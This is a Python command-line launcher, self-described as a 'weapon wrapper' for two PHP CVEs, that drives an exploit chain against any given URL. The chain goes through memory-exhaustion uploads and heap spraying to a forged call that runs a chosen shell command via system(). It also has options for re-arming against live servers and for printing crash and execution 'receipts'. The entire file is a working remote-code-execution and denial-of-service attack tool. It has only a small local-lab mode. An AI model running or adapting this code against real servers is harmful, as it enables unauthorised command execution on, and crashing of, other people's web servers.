#!/usr/bin/env python3
"""php2shell launcher — CVE-2026-109618 / CVE-2026-109619 weapon wrapper.

Wraps the tuned arm -> p1 -> spray -> call chain (poc_unserialize +
php2shell_weapon) with a CLI that takes any target URL and flags, runs the
stage flow, and prints PASS/FAIL receipts per stage.

Usage:
  python3 php2shell.py http://target/index.php --command 'id'
  python3 php2shell.py https://site.nl/upload.php --profile low --rearm
  python3 php2shell.py 127.0.0.1:18120 --local-lab --lab --profile low
  python3 php2shell.py http://host/x.php --check

Exit codes: 0 = at least one kill/exec receipt, 1 = ran clean (no crash),
2 = target unreachable / usage.
"""
from __future__ import annotations
import argparse, os, subprocess, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P
import php2shell_weapon as W

LAB_DIR = "/tmp/php2shell_ap"
LAB_PORT = 18120

# the empirically tuned sweet spot (this package's receipts)
SWEET = dict(files=20, namelen=98304, p1units=390, spray=200, tcount=149)

PROFILES = {
    "low":    dict(files=20, namelen=98304,   p1units=390, spray=200),
    "medium": dict(files=12, namelen=262144,  p1units=390, spray=250),
    "high":   dict(files=20, namelen=1310720, p1units=390, spray=150),
}


def sh(cmd, **kw):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True, **kw)


def urlize(t):
    if "://" not in t:
        t = "http://" + t
    if not t.split("://", 1)[1].count("/"):
        t = t.rstrip("/") + "/index.php"
    return t


def local_lab_up():
    sh(f"bash {LAB_DIR}/rce_lab.sh >/dev/null 2>&1")
    r = sh(f"curl -s -m 3 http://127.0.0.1:{LAB_PORT}/index.php")
    return r.returncode == 0


def check(url):
    print(f"[check] GET {url}")
    try:
        st, d, dt = P.send(url, b"", b"x", "check" + "0" * 27, 0.0, 0)
    except OSError as e:
        print(f"[check] unreachable: {e}")
        return False
    body = d[:200]
    print(f"[check] status={st} dt={dt:.2f}s body={body!r}")
    if b"SAPI=" in d:
        sapi = d.split(b"SAPI=")[1].split(b"\n")[0].decode(errors="replace")
        print(f"[check] SAPI={sapi}"
              + ("  (persistent-per-child: full chain class)"
                 if sapi in ("apache2handler", "cli-server") else
                 "  (FPM/CGI/LSAPI: DoS-class only)"))
    return st is not None


def run(args):
    url = urlize(args.target)
    prof = dict(PROFILES[args.profile])
    prof["files"] = args.arm_files or prof["files"]
    prof["namelen"] = args.arm_namelen or prof["namelen"]
    prof["spray"] = args.spray or prof["spray"]
    prof["tcount"] = args.t_count or SWEET["tcount"]
    bnd = b"UctxPoc2026"
    stall = 0.0 if args.lab else args.stall
    chunk = 0 if args.lab else args.chunk
    sid = args.sid or ("u0123456789abcdefghijklmnopqrstuv")
    fsid = args.fire_sid or ("uu123456789abcdefghijklmnopqrstu")
    receipts = []

    print("php2shell | target=%s profile=%s files=%d namelen=%dKB spray=%d "
          "cmd=%r attempts=%d" % (url, args.profile, prof["files"],
                                  prof["namelen"] // 1024, prof["spray"],
                                  args.command, args.attempts))

    # ---- ARM ---------------------------------------------------------------
    arm = P.arm_body(sid, bnd, prof["files"], prof["namelen"])
    print("\n[arm ] body=%dKB" % (len(arm) // 1024), flush=True)
    st, d, dt = W.safe_send(url, arm, bnd, sid, stall, chunk)
    oom = (st == 500) or (b"exhausted" in d)
    print("[arm ] status=%s dt=%.2fs preRINIT-OOM=%s" % (st, dt, oom), flush=True)
    if oom:
        receipts.append("R1 ARM-ORPHAN (HTTP 500, fatal in Unknown on line 0)")
    if st is None:
        receipts.append("KILL signature at arm (no HTTP)")

    # ---- P1 ----------------------------------------------------------------
    p1 = P.fire1_body(sid, bnd, prof["p1units"] * 11000)
    print("\n[p1  ] body=%dKB" % (len(p1) // 1024), flush=True)
    st1, d1, dt1 = W.safe_send(url, p1, bnd, sid, 0.0, 0)
    print("[p1  ] status=%s dt=%.2fs" % (st1, dt1), flush=True)
    if st1 == 500:
        receipts.append("P1 decode-OOM fatal")

    # ---- SPRAY (reclaim + marker receipt) -----------------------------------
    ctx = P.forge_ctx(W.MARKER, W.MARKER, used=1018, data0=W.MARK_DATA0)
    body = P.fire_body(fsid, bnd, prof["spray"], ctx,
                       n_small=prof["tcount"])
    print("\n[spray] s[]=%d t[]=%d body=%dKB" % (prof["spray"], prof["tcount"],
                                                 len(body) // 1024), flush=True)
    st2, d2, dt2 = W.safe_send(url, body, bnd, fsid, stall, chunk)
    print("[spray] status=%s dt=%.2fs" % (st2, dt2), flush=True)
    hexb = d2.hex()
    hit_ascii = b"4141414141414141" in d2 or "4141414141414141" in hexb
    if hit_ascii:
        receipts.append("SPRAY last_dtor marker reflected (reclaim receipt)")
        print("[spray] HIT last_dtor marker", flush=True)
    if b"4242424242424242" in d2 or "4242424242424242" in hexb:
        print("[spray] HIT data0 marker", flush=True)
    if st2 is None:
        receipts.append("SPRAY kill/wedge signature (no HTTP)")
        print("[spray] KILL signature (worker died mid-request)", flush=True)

    # ---- CALL (retry envelope; ASLR/leak gated on the target build) ---------
    if not args.skip_call:
        exec_hit = False
        for i in range(1, args.attempts + 1):
            if args.rearm:
                W.safe_send(url, arm, bnd, sid, stall, chunk)
            t_small = W.call_forge(args.command.encode(), W.MARKER)
            cbody = P.fire_body(fsid, bnd, prof["spray"], ctx,
                                n_small=prof["tcount"], t_small=t_small)
            print("\n[call] attempt %d/%d body=%dKB"
                  % (i, args.attempts, len(cbody) // 1024), flush=True)
            st3, d3, dt3 = W.safe_send(url, cbody, bnd, fsid, stall, chunk)
            print("[call] status=%s dt=%.2fs" % (st3, dt3), flush=True)
            if b"uid=" in d3 or b"root:" in d3:
                print("[call] *** EXEC marker (uid=/root:) -> system() ran ***")
                receipts.append("EXEC uid= in response (system() ran)")
                exec_hit = True
                break
            if st3 is None:
                receipts.append("CALL kill/wedge signature (no HTTP)")
                print("[call] KILL/EXEC signature (worker died mid-request)")
                break
        if not exec_hit and st2 is not None and st3 is not None:
            print("[call] no exec marker this envelope "
                  "(ASLR/leak-gated; see WEAPON_NOTES.md)")

    # ---- summary ------------------------------------------------------------
    print("\n==== RECEIPTS ====")
    for r in receipts:
        print(" PASS:", r)
    if not receipts:
        print(" (no receipts — target may not be vulnerable or tuned "
              "parameters need adjustment)")
    return 0 if receipts else 1


def main():
    p = argparse.ArgumentParser(description="php2shell launcher")
    p.add_argument("target", help="host, IP or full URL (index.php)")
    p.add_argument("--command", default="id", help="command for the final call")
    p.add_argument("--profile", default="low", choices=sorted(PROFILES))
    p.add_argument("--arm-files", type=int)
    p.add_argument("--arm-namelen", type=int)
    p.add_argument("--spray", type=int)
    p.add_argument("--t-count", type=int)
    p.add_argument("--attempts", type=int, default=8)
    p.add_argument("--stall", type=float, default=1.35)
    p.add_argument("--chunk", type=int, default=8192)
    p.add_argument("--sid", default=None)
    p.add_argument("--fire-sid", default=None)
    p.add_argument("--rearm", action="store_true",
                   help="re-ARM before every call attempt (live multi-worker)")
    p.add_argument("--lab", action="store_true", help="no stalls (local lab)")
    p.add_argument("--skip-call", action="store_true")
    p.add_argument("--check", action="store_true",
                   help="baseline check only, no attack")
    p.add_argument("--local-lab", action="store_true",
                   help="spin up the local Apache lab and target it")
    a = p.parse_args()

    if a.local_lab:
        print("[lab  ] starting local Apache lab on 127.0.0.1:%d" % LAB_PORT)
        if not local_lab_up():
            print("[lab  ] FAILED to start (see %s/error.log)" % LAB_DIR)
            sys.exit(2)
        a.target = "127.0.0.1:%d/index.php" % LAB_PORT
        a.lab = True

    url = urlize(a.target)
    if a.check:
        sys.exit(0 if check(url) else 2)
    if not check(url):
        print("[check] target unreachable — aborting")
        sys.exit(2)
    sys.exit(run(a))


if __name__ == "__main__":
    main()
